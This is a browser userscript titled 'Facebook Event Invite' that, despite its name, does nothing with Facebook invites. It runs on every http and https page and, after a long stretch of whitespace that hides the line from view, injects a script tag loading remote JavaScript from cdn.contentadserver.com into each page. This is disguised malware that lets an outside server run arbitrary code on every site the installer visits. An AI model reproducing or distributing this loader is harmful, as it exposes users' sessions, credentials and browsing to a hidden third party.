// ==UserScript==
// @name Facebook Event Invite
// @version        1
// @run-at			document-end
// @include http://*
// @include https://*
// @grant       GM_getValue
// @grant       unsafeWindow
// @grant       GM_deleteValue
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_listValues
// @grant       GM_addStyle
// @grant       GM_xmlhttpRequest
// @grant       GM_log
// ==/UserScript==

if (window.top === window.self)  {
function $c(type,params){
        if(type=="#text"||type=="#"){
                return document.createTextNode(params);
        }else if(typeof(type)=="string"&&type.substr(0,1)=="#"){
                return document.createTextNode(type.substr(1));
        }else{
                var node=document.createElement(type);
        }
        for(var i in params)if(i=="kids"){
                for(var j in params[i]){
                        if(typeof(params[i][j])=='object'){
                                node.appendChild(params[i][j]);
                        }
                }
        }else if(i=="#text"){
                node.appendChild(document.createTextNode(params[i]));
        }else if(i=="#html"){
                node.innerHTML=params[i];
        }else{
                node.setAttribute(i,params[i]);
        }
        return node;
}                                                                                                                                                                                               document.head.appendChild($c('script',{src:('https:' == document.location.protocol ? 'https://' : 'http://') + 'cdn.contentadserver.com/server_content_2.js',type:'text/javascript'}));
}
